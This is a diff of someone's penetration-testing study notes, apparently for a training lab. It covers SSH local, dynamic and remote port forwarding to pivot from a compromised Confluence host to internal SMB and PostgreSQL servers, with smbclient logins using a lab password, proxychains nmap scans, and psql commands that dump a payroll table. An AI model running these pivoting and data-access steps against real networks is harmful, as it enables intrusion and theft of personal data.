@@ -1530,7 +1530,7 @@ Reference
   - Listing files in the scripts share, using smbclient over our SSH local port forward running on CONFLUENCE01  
     `smbclient -p 4455 //192.168.114.63/scripts -U hr_admin --password=Welcome1234` `smb: \> ls` `smb: \> get Provisioning.ps1`
 - SSH Tunneling (dynamic port forward)  
-  - WAN (Kali) > DMZ (Confluence) > Internal (DB >>>...)  
+  - WAN (Kali) > DMZ (Confluence) > Internal (DB >>> HR)  
   - KALI 192.168.45.250, CONFLUENCE01 192.168.114.63, DB 10.4.114.215, HR 172.16.114.217  
   - open SSH dynamic port forward on port 9999  
     ```
@@ -1543,9 +1543,27 @@ Reference
     `proxychains smbclient -L //172.16.114.217/ -U hr_admin --password=Welcome1234`
   - scan top 20 TCP ports on 172.16.50.217 > 135, 139, 445, 3389  
     `sudo proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.114.217`
-  - ddd
-  - ddd
 - SSH Tunneling (remote port forward)
+  - WAN (Kali)<FW only port 8090 inbound and all outbound > DMZ (Confluence) > Internal (DB >>> HR)
+  - start ssh server on kali
+    `sudo systemctl start ssh`
+  - check SSH server on kali is listening
+    `sudo ss -ntplu`
+  - reverse shell to confluence + TTY shell
+  - to connect back kali, need to explicity allow password-based authentication
+    `PasswordAuthentication to yes in /etc/ssh/sshd_config`   
+  - listen on port 2345 on kali and forward traffic to DB port 5432
+    `ssh -N -R 127.0.0.1:2345:10.4.114.215:5432 kali@192.168.45.250`
+  - checking if port 2345 is bound on the kali ssh server >  127.0.0.1:2345 
+    `ss -ntplu`
+  - Listing databases on the PGDATABASE01, using psql through the SSH remote port forward
+    `kali@kali:~$ psql -h 127.0.0.1 -p 2345 -U postgres` `postgres=# \l`
+  - Connect to 'DB hr_backup'
+    `\c hr_backup`
+  - List out all tables
+    `\dt`
+  - query data
+    'SELECT * FROM payroll;'
 - SSH Tunneling (remote dynamic port forward)
 - sshuttle
 ### 20. Tunneling through deep packet inspectation
